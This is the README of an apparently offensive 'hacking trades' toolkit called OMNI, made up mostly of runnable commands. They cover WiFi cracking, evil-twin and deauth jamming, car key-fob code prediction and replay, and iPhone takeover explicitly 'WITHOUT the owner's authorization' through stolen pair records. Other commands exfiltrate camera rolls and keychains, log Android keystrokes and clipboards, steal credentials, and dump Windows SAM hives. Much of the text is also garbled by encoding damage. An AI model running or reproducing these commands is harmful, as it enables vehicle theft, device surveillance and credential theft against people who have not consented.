# OMNI ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â thirteen fused security trades

**OMNI** fuses thirteen hacking trades into one Kali-first Python CLI. The first
seven are upstream ports; the last five are the elite tier: real WiFi attack,
universal radio, car-key work, brute force and phone takeover ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â Android over
ADB and iPhone over pymobiledevice3 (files, backups, profiles, HID, traffic).

| Upstream repo | Trade | Where |
|---|---|---|
| Private-Unleashed-2.0-FlipperZero-Firmware | Sub-GHz RF (CC1101), sniff/replay/decode/jam | `omni.rf` |
| *(this project)* | WiFi: monitor, capture, PMKID, WPS, crack, evil twin | `omni.wifi` |
| *(this project)* | Universal radio: SDR sweep, rtl_433, RFID/NFC, BT, IR | `omni.radio` |
| *(this project)* | Car keys: RKE profiles, KeeLoq hunt, counter sweep | `omni.car` |
| *(this project)* | Brute force: masks, mutation, HTTP, hydra, hashes | `omni.brute` |
| PhoneSploit-Pro | Android device takeover | `omni.android` |
| pymobiledevice3 + libimobiledevice | iPhone/iPad takeover | `omni.ios` |
| unbekannt-framework | Module shell / registry | `omni.core` |
| Mobile-Device-Hacker-Toolkit | APK reversing (Frida/jadx) | `omni.mobile` |
| Windows-Hacking-Scripts-With-Python | Windows credentials & persistence | `omni.windows` |
| newsyc + MarcoSero/HackerNews | Hacker News client | `omni.news` |
| flipperc0d3r firmware assets | Flipper file formats | `omni.flip` |

Pure standard-library core; external binaries (aircrack-ng, hcxdumptool,
rtl_433, hashcat, adb, nmapÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¦) are declared per-module via `NEEDS` and checked
before anything runs. Hardware (radio, adapter, GPS, PN532) degrades to demo
mode when absent, so every module stays runnable.

## Install (Kali / Debian)

```sh
git clone <this repo> omni-toolkit && cd omni-toolkit
sudo ./install.sh          # or ./install.sh --user
omni doctor                # what this box can actually do
```

`install.sh` checks for Python >= 3.11 and `python3-venv` first, installs the
system packages, then creates the venv ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â `./install.sh --deps-only` stops after
the packages if you want to manage the Python side yourself.

### Nothing installed yet? It still runs

External tools are **optional, always**. On a bare host the toolkit starts,
opens the menu, and each module either finds a native fallback or says exactly
what it needs and exits cleanly:

* Wi-Fi on Windows uses `netsh` for adapter inventory, AP scan, link status and
  joining (`wifi.scan`, `wifi.adapters`, `wifi.link`, `wifi.connect`), so those
  work with no aircrack-ng and no monitor-mode adapter;
* `pentest.scan` falls back to a built-in threaded connect scan when `nmap` is
  absent; `pentest.recon` resolves/CT-checks in pure Python;
* the CC1101 trades run in labelled demo mode when there is no SPI header;
* brute force, hashing previews, Flipper files, Windows tradecraft and Hacker
  News are pure Python and need nothing at all;
* a missing tool is a warning plus `omni setup`, never a traceback ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â and the
  process still exits 0.

```sh
omni devices           # what this box has, present or not
omni setup             # install what is missing (winget / brew / apt / pip)
omni doctor            # readiness matrix; never fails
```

### Windows / macOS binaries (no Python needed)

A frozen build is `bin/OMNI.exe`; rebuild it from the same spec with
`packaging/build_windows.ps1` (or `packaging/build_macos.sh` on a Mac) and
install shortcuts with `packaging/install_windows.ps1`. A double-click opens
the goal menu. See [`packaging/README.md`](packaging/README.md).

### Linux notes

Linux is the target platform; several modules need things Windows cannot give:

| Need | Why | How |
|---|---|---|
| root (`sudo omni ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¦`) | monitor mode, raw sockets, SPI/GPIO | only for those trades |
| `rf.allow_extended_freq` | TX outside ISM bands | keep `true` on a licensed setup |
| `/dev/spidev0.0` + GPIO chip | CC1101 injection/RX | enable SPI on the Pi |
| monitor-mode adapter | all `wifi.*` | `omni doctor --family wifi` |
| `usbmuxd` + a udev rule | iPhone over USB | `apt install usbmuxd` |
| `palera1n` (optional) | `ios.checkm8` on A5ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã¢â‚¬Å“A11 | its own repo, no apt package |
| RSD tunnel | iOS 17.0ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã¢â‚¬Å“17.3 only | `pymobiledevice3 lockdown start-tunnel` |

### macOS

`./install.sh` detects Darwin and hands over to `scripts/install-macos.sh`
(Homebrew, `--deps-only` supported). Python 3.11+ from `brew install python@3.12`.

The split is honest and it is not about the language ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â everything here is
stdlib Python ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â but about the radio:

| Works | Degraded | Effectively no |
|---|---|---|
| the whole `ios.*` trade (usbmux is native) | `wifi.*` capture on the built-in card: `airport` tuning, `networksetup` discovery, no persistent monitor vif | `rf.*` (no `/dev/spidev*`), `car.*` (same CC1101), `omni.windows` |
| `wifi.crack_pure`, `wifi.decrypt`, `wifi.extract` (pure Python, no adapter) | `wifi.scan`/`handshake` only with an external adapter that macOS exposes | `wifi.eviltwin`, `wifi.reconnect` (need `hostapd`/`mdk4` + a real monitor iface) |
| `brute.*`, `news.*`, `flip.*`, `pentest.*` | `radio.*` only for USB dongles (`rtl_sdr`, PN532 via `libnfc`) | |

Pair records live in `/var/db/lockdown` and `~/Library/Lockdown`, and
`ios.record ACTION=plant` targets the former ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â `killall usbmuxd` (not
`systemctl`) makes it take effect. Everything platform-specific sits in
`omni/core/platform.py`, so the modules ask rather than guess.

Text files are LF-only via `.gitattributes`; if a checkout still has CRLF
run `python3 scripts/normalise_eol.py` (it also restores the exec bit on
`install.sh` and `bin/omni`). Python 3.11+ is required ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â the process pool in
`wifi.crack_pure` and the `X | None` annotations rely on it.

`omni doctor` prints a per-trade readiness matrix and never fails, which makes
it the right first command after cloning on an unknown system.

## Usage

```sh
omni                       # tabbed dashboard (a TTY) or module list
omni dash                  # force the dashboard
# keys: TAB = next trade, up/down = select, x = run, o = OPT=value, / = filter
# tabs: WiFi | Sub-GHz | Car keys | Android | iPhone | Windows | Brute | Core

omni list                  # all modules
omni search wifi           # registry search
omni run windows.wifi      # one-shot module run
omni --json run news.user NAME=tlg     # machine-readable output
omni --no-color run pentest.scan TARGETS=192.0.2.0/24
```

Interactive shell:

```
omni> use android.mirror
android.mirror > options
android.mirror > set RATE 60
android.mirror > run
android.mirror > back
```

## Trade highlights

```sh
# WiFi ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â needs a monitor-mode adapter, run as root
omni run wifi.scan METHOD=airodump
omni run wifi.handshake BSSID=00:11:22:33:44:55 CHANNEL=6
omni run wifi.crack PCAP=loot.cap WORDLIST=/usr/share/wordlists/rockyou.txt
omni run wifi.pmkid SECONDS=90          # clientless, converts to hashcat 22000
omni run wifi.wps BSSID=00:11:22:33:44:55            # pixie dust

# Rogue AP ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â a twin that clients actually join, not two config files
omni run wifi.eviltwin SSID=Office PSK=<real psk> BSSID=<ap> MON=wlan0mon \
                         PORTAL=true UPLINK=eth0 SECONDS=600
omni run wifi.pineapple SSID=Office PSK=<real psk> UPLINK=auto   # all of it on
omni run wifi.pineapple MON=wlan0mon UPLINK=auto   # no SSID: clone the best AP
omni run wifi.sniff IFACE=wlan0           # HTTP requests + creds, live
omni run wifi.sniff MON=true PSK=<psk> IFACE=wlan0   # CCMP decrypted live
omni run wifi.tls PCAP=loot/twin_Office/traffic.pcap   # SNI + cert names, no key

# Universal radio
omni run radio.hardware                 # probe SDR/RFID/BT/IR presence
omni run radio.sweep BAND=ism433        # rtl_power peak table
omni run radio.sensors SECONDS=60       # rtl_433 weather/TPMS/meters
omni run radio.rfidsearch               # Proxmark3 UID + protocol
omni run radio.bluetooth MODE=ble

# Car keys ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â ./assets/keeloq_keys.txt holds the manufacturer DB
omni run car.profiles BRAND=audi
omni run car.analyze SUB=fob.sub BRAND=Audi
omni run car.sweep SUB=fob.sub COUNT=64 # future codes, counter mode aware
omni run car.replay SUB=loot/sweep/      # transmit the generated frames
omni run car.inject SUB=fob.sub WINDOW=256   # whole window as one fast train

# Sub-GHz injection ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â re-encodes frames instead of blind RAW replay
omni run rf.inject FILES=loot/433920000.sub COPIES=4 GAP=0
omni run rf.inject FILES='Princeton:24:ABC123,CAME:12:5A5'
omni run rf.rolljam FREQ=433920000 SECONDS=10   # jam, capture, then dominate
omni run rf.auto FREQ=433920000 SECONDS=60      # AFC + AGC while it listens

# Android control (see also android.grant / android.debloat / android.backup)
omni run android.unlock PATTERN='180,1400;540,1400;900,1400'
omni run android.type TEXT='hello world' ENTER=true
omni run android.tap_text TEXT='Sign in' WAIT=5
omni run android.grant PACKAGE=com.example PERM=camera,location
omni run android.backup PACKAGE=com.example

# iPhone ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â the powerful end of the family
# ---- connect with no passcode, no password ----
# Ladder: visible ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ untrusted ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ dialog ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ trusted. It names the rung, then pairs
# and polls for the tap so nothing has to be timed by hand.
omni run ios.probe                        # read-only: which rung are we on?
omni run ios.connect                      # USB: probe, pair, verify (no passcode)
omni run ios.connect HOST=192.168.1.50    # same over the LAN
omni run ios.connect KEYBAG=kb.plist      # supervised: pairs with zero taps
omni run ios.wifi_onboard SSID=TheirWiFi RUN=true   # evil-twin it onto your AP
# ---- controlling it WITHOUT the owner's authorization ----
# The Trust dialog only exists to create a pair record; whoever holds that
# record holds the authorization. So steal, carry and replay it instead.
omni run ios.audit                        # score every route, cheapest first
omni run ios.hosts                        # who else is trusted (a census)
omni run ios.hosts ACTION=keep-only       # revoke everyone but us
omni run ios.record ACTION=scan           # records already on this host
omni run ios.record ACTION=export         # pull the record off a trusted box
omni run ios.record ACTION=steal USERHOST=you@backup-box   # take theirs
omni run ios.record ACTION=plant RECORD=r.plist   # replay it (no prompt)
omni run ios.record ACTION=show RECORD=r.plist    # what it buys (escrow = backup crypto)
omni run ios.record ACTION=grab           # jailed device: lift its own records
omni run ios.syncwifi ACTION=on           # remote channel survives cable pulls
omni run ios.discover SECONDS=15          # mobdev2/62078: control over the LAN
omni run ios.remotepair                   # promptless RemotePairing bootstrap
omni run ios.pair_supervised KEYBAG=kb.plist      # supervised device: no alert
omni run ios.checkm8 RUN=true             # A5ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã¢â‚¬Å“A11 bootrom: root, no trust at all
omni run ios.ssh CMD='id'                 # that root shell (iproxy 2222 22)
omni run ios.heartbeat SECONDS=60         # hold the session warm
omni run ios.takeover                     # cheapest route + proof of control

# One-time (when nothing can be stolen or exploited): pair, then unblock
omni run ios.devices && omni run ios.pair
omni run ios.status                       # what's blocking control, if anything
omni run ios.up                           # fix it (amfi + auto-mount), then:

# full remote control: one persistent session
omni run ios.remote
iphone> tap 32768 40000
iphone> text hello world
iphone> key enter
iphone> shot
iphone> lock

# filesystem: app sandboxes, system volume, /tmp (Developer Mode)
omni run ios.app_containers GREP=whatsapp    # which apps have containers
omni run ios.ls DOMAIN=appData PATH=. BUNDLE=com.whatsapp.WhatsApp
omni run ios.pull DOMAIN=appData PATH=Documents/x.db BUNDLE=com.x
omni run ios.push DOMAIN=temporary PATH=/p.bin LOCAL=./p.bin
omni run ios.rm DOMAIN=temporary PATH=/junk

# interception: route traffic through your listener, then read the loot
omni run ios.proxy SERVER=10.0.0.9 PORT=8080   # + ios.profile_install CA = MITM
omni run ios.proxy_off
omni run ios.backup_extract DIR=loot/ios/backups/... # unpack a backup
omni run ios.backup_file DIR=<backup> DOMAIN=AppDomain-com.x PATH=Documents/a.db

# or scripted, no TTY needed
omni run ios.remote SCRIPT='unlock; text 1234; key enter; shot; launch com.apple.mobilesafari'

# no-root tunnel is automatic on iOS 17.4+; only set these for iOS 17.0-17.3
# pymobiledevice3 lockdown start-tunnel    # prints HOST PORT, run as root
omni config set ios.rsd_host 127.0.0.1
omni config set ios.rsd_port 49152

omni run ios.afc ACTION=ls REMOTE=/        # photo library, no Developer Mode
omni run ios.afc ACTION=pull REMOTE=/DCIM  # exfil the camera roll
omni run ios.sandbox_pull REMOTE=/var/mobile/Containers/.../x.db  # any sandbox
omni run ios.backup                        # full unencrypted backup = app data

# not sure what to run? print the ordered chain for a trade, with blockers
omni run core.plan TRADE=ios
omni run core.plan TRADE=wifi              # marks missing tools / root needs
omni run ios.sniff COUNT=2000              # pcap of the phone's own traffic
omni run ios.crash && omni run ios.sysdiagnose
omni run ios.profile_install PROFILE=ca.mobileconfig   # trusted CA / proxy
omni run ios.app_install PATH=tool.ipa     # sideload a payload
omni run ios.apps GREP=whatsapp            # inventory
omni run ios.location LAT=51.5007 LON=-0.1246
omni run ios.syslog SECONDS=15             # no Developer Mode needed either

# Brute force
omni run brute.space MASK=?d?d?d?d
omni run brute.mutate WORDS=company2026
omni run brute.http URL=https://gw.test/login USER=admin PASSWORDS=words.txt
omni run brute.identify HASH=5f4dcc3b5aa765d61d8327deb882cf99
omni run brute.hashes FILE=hashes.txt WORDLIST=rockyou.txt
omni run brute.pin LENGTH=4 COUNT=400   # spray PINs over the radio

# ---- de-encryption: crack the PSK, then read the traffic ----
omni run wifi.handshakes PCAP=capture.cap            # what's testable in there
omni run wifi.crack_pure PCAP=capture.cap WORDLIST=words.txt
omni run wifi.crack_pure PCAP=capture.cap MASK="?u?l?l?l?l?d?d"
omni run wifi.decrypt PCAP=capture.cap PSK=hunter22   # plaintext to loot

# ---- batch decryption: throw captures + keys at it, take the loot out ----
omni run wifi.extract INPUT=loot/wifi/ PSK=keys.txt      # ssid:psk lines
omni run wifi.extract INPUT='cap/*.pcap' PSK='cap/*.txt' # many captures, many keys
omni run wifi.extract INPUT=capture.cap PSK=hunter22     # bare key, one AP
# -> streams/, files/, urls.txt, dns.txt, sni.txt, creds.txt, manifest.json
# AUTO (default) also reuses every psk_*.txt wifi.crack_pure already printed

# ---- antenna + wideband hunting ----
omni run rf.tune FREQ=433920000 SPAN_KHZ=120      # calibrate gain/LNA/trim
omni run rf.hunt PLAN=eu SECONDS=120              # find ANY signal, then decode
omni run rf.hunt PLAN=world SECONDS=300 MARGIN=3  # long-range sweep
omni run rf.inject FILES=loot/last.sub COPIES=4   # then hit what you found

# ---- aggressive WiFi ----
omni run wifi.deauth_rage BSSID=AA:BB:CC:DD:EE:FF RUNTIME=120
omni run wifi.reconnect BSSID=AA:BB:CC:DD:EE:FF SSID=Office SECONDS=300
omni run wifi.reconnect BSSID=AA:BB:CC:DD:EE:FF   # broadcast: kicks everyone

# ---- the dangerous tier ----
# One command end to end: listen, recover the OEM key, predict, transmit
omni run car.unlock SECONDS=25 WINDOW=128
# Blind fixed-code sweep ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â no capture at all, 4096 CAME codes in one pass
omni run rf.brute PROTOCOL=CAME COUNT=4096
omni run rf.brute PROTOCOL=Princeton START=0xA0000 COUNT=2000 STEP=4

# Android: make it stay, and take the credentials
omni run android.persist PACKAGE=com.example            # alarm + Doze exemption
omni run android.persist PACKAGE=com.example ACTION=status
omni run android.hijack SECONDS=300                     # log every clipboard entry
omni run android.creds                                  # Wi-Fi PSKs, SMS, call log

# iPhone: supervision, restriction, wipe
omni run ios.supervise ORG=ACME                         # MDM-grade control
omni run ios.restrictions OTADELAY=90                   # freeze OTA for 90 days
omni run ios.wifi_profile SSID=EvilTwin PASSWORD=hunter2
omni run ios.keybag                                     # keeps backups readable
omni run ios.erase KEEP_ESIM=true                       # DESTRUCTIVE

# ---- the takeover tier: tree-driven Android, backup-side iPhone ----
omni run android.ui ACTION=text                        # what the screen says, in order
omni run android.ui ACTION=tap MATCH='Sign in'         # tap a *node*, not a pixel
omni run android.ui ACTION=dump OUT=loot/ui/login.xml  # the tree, for offline work
omni run android.automate DRY=true SCRIPT='wait "Sign in"; tap "Sign in"'
omni run android.automate FILE=flows/login.flow        # unlock/type/tap/screenshot
omni run android.keylog SECONDS=60                     # getevent -> the typed text
omni run android.notify                                # the shade, bodies included
omni run android.notify ACTION=save LIMIT=200

# iPhone: what a backup is worth, offline, with no jailbreak
omni run ios.loot DIR=loot/ios/backups/2026-08-13_101500   # category census
omni run ios.loot DIR=<backup> CATEGORY=keychain EXTRACT=true
omni run ios.loot DIR=<backup> GREP=whatsapp EXTRACT=true
omni run ios.keychain DIR=<backup> ACTION=items TABLE=genp
omni run ios.keychain DIR=<backup> ACTION=dump OUT=kc.json
omni run ios.automate DRY=true SCRIPT='tap 0.5,0.85; type hello'
omni run ios.automate FILE=flows/open-safari.flow      # HID, unattended

# Windows: stop guessing which window has focus
omni run windows.window                                # every window, with pids
omni run windows.window MATCH=outlook ACTION=focus
omni run windows.window MATCH=notepad ACTION=kill
omni run windows.clipboard ACTION=watch SECONDS=300    # whatever the user copies
omni run windows.service                               # what starts at boot
omni run windows.service ACTION=install SERVICE=omni BINARY=C:\payload.exe
omni run windows.service ACTION=hives OUT=loot/hives   # SAM/SYSTEM for cracking
omni run windows.reg ACTION=query KEY='HKCU\Software\Microsoft\Windows\CurrentVersion\Run'

# Car: survey the bands before committing to one carrier
omni run car.hunt SECONDS=60                           # all bands, ranked
omni run car.hunt REGION=us DWELL_MS=150              # 315 MHz only
omni run car.frame SUB=fob.sub                         # split, counter, next codes
omni run car.frame SUB=fob.sub ENTRY=vw SEED=0x1234 COUNT=8

# WiFi jamming: five floods, hopping, automatic target
omni run wifi.jam MODE=deauth BSSID=AA:BB:CC:DD:EE:FF SECONDS=60
omni run wifi.jam MODE=deauth SCAN=15 SECONDS=120     # pick the strongest AP
omni run wifi.jam MODE=beacon SECONDS=60              # unusable scan list
omni run wifi.jam MODE=auth BSSID=<ap> PPS=2000
omni run wifi.jam MODE=eapol BSSID=<ap> SSIDS=Office  # WPA3/PMF clients
omni run wifi.jam MODE=disassoc BSSID=<ap> CHANNELS=1-11
```

## Module contract

```python
from omni.core.module import Module, Option

class Ask(Module):
    NAME = "news.search"
    DESCRIPTION = "..."
    OPTIONS = (Option("QUERY", "what to search", "", required=True),)

    def execute(self) -> object:
        ...
```

Drop user modules into `~/.config/omni/modules/` and they are discovered
automatically.

## One-click first

The easiest way in is the first key of the menu:

```sh
omni                 # then press `a`
omni auto            # or straight from a shell
```

`a` runs every safe local check with no questions ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â this box's adapters,
phones and radios, nearby Wi-Fi, saved Wi-Fi passwords, LAN hosts and open
ports, browser exposure, autoruns ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â and writes `report.md` + `report.json`
into the loot folder, which it opens for you. Missing tools are skipped and
listed, never fatal. `OMNI One-Click` on the Desktop does the same on a
double-click. `omni auto --profile full` adds tool readiness and a network
walk. Everything here is read-only.

`omni` with no arguments opens the same menu; admin-only checks (other users'
DPAPI secrets, services, raw sockets) relaunch through UAC automatically and
fall back to unelevated if you decline. `--elevate` does it explicitly.

## Dashboards ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â click a goal, not a module

Three front ends over the same modules:

```sh
omni gui      # the clickable window (also the bare-double-click exe)
omni dash     # full-screen tabbed dashboard (curses)
omni goal K   # one goal from a shell, e.g. omni goal wifi-attack
omni goals    # list the goals and whether they are ready here
```

The window has **cards written the way people ask for things**:

| Card | What one click does |
|---|---|
| Wi-Fi attack | finds the strongest network, captures a handshake, tries to crack it |
| iPhone takeover | finds the attached iPhone, checks control, reads identity/status |
| Windows takeover | saved Wi-Fi keys, browser logins, admins, startup entries |
| Android attack | device info, saved accounts, messages, installed apps |
| Wi-Fi jam | deauth flood across the channels |
| Car key | listen for a fob, predict counters, replay |
| Network scan | every LAN host and its open ports |
| Saved passwords | Wi-Fi keys saved on this computer |
| One-click audit | every safe local check plus a report |
| This box | adapters, phones, radios, tools, loot |

Each card shows **READY** or **NEEDS SETUP** and which tool is missing *before*
you click. A click discovers the target and runs the chain; if a tool is
missing it is a yellow line with the install command and the fallback path
still runs, so every button finishes with a result or a plain next step. No
traceback, no modal error, no dead end. Advanced users get the full module
browser from the header button.

The tabbed dashboard keeps **Home as its first tab** with the same actions;
trade tabs show readiness counts, missing tools, command preview, output
scrolling and one-key shortcuts. Without a terminal or Tk it prints a
readiness matrix and exits 0.

## What changed in 1.4.2 â€” press it and it finishes

* **Every step has a hard timeout** (25â€“45 s). A hung adapter or WSL command
  can no longer leave a card spinning forever; the goal moves on and reports
  `partial` with the reason.
* **No hidden installer blocking a click**. Auto-install is off by default;
  the explicit "Install missing tools" button still does it.
* **Wi-Fi attack always finishes**: it scans and shows saved keys first, and
  only tries a handshake when the capture tools exist. A target option is no
  longer injected into modules that do not accept it.
* **Handshake finds its own channel**, so the real capture path works with
  just a BSSID.
* **Cleaner window**: five big cards in two columns, five compact quick
  actions in one row, and a large output pane.
* **One universal shortcut**: `Cyberdeck` only; older OMNI and extra
  Cyberdeck shortcut names are removed on install.
* The frozen build's `gui --check` now clicks **all five** headline cards and
  fails the build if any stays running.

## What changed in 1.4.1 Ã¢â‚¬â€ buttons actually click

* **Fixed the dead dashboard buttons**: Tk variables were being read from the
  worker thread, which raises "main thread is not in main loop". The install
  preference is now captured on the UI thread before the job starts.
* **Cyberdeck branding**: window title and header, a new neon `CD` icon in the
  exe, and Desktop / Start Menu shortcuts renamed to `Cyberdeck`,
  `Cyberdeck Dashboard` and `Cyberdeck One-Click` (old OMNI shortcuts are
  removed on install).
* A regression test now clicks a card under the real Tk event loop.

## What changed in 1.4 ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â goals, not modules

* **The dashboard is now ten plain-English cards**: Wi-Fi attack, iPhone
  takeover, Windows takeover, Android attack, Wi-Fi jam, Car key, Network
  scan, Saved passwords, One-click audit, This box. Each shows READY / NEEDS
  SETUP and the missing tool before you click.
* **Every card runs its own target discovery** (strongest AP, attached phone,
  LAN) and a fallback when the real tools are absent, so a click always ends
  with output or one plain next step ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â never a traceback or modal.
* **New goal engine** (`omni/core/goals.py`, `omni goal`, `omni goals`) shared
  by the GUI and the shell; outcomes are `done`, `partial` or `skipped`.
* **Dark, readable card window** with hover, accent bar, progress bar, live
  output and an optional advanced module browser behind one header button.
* **No startup scans:** readiness is a cheap tool check, so the window opens
  immediately.

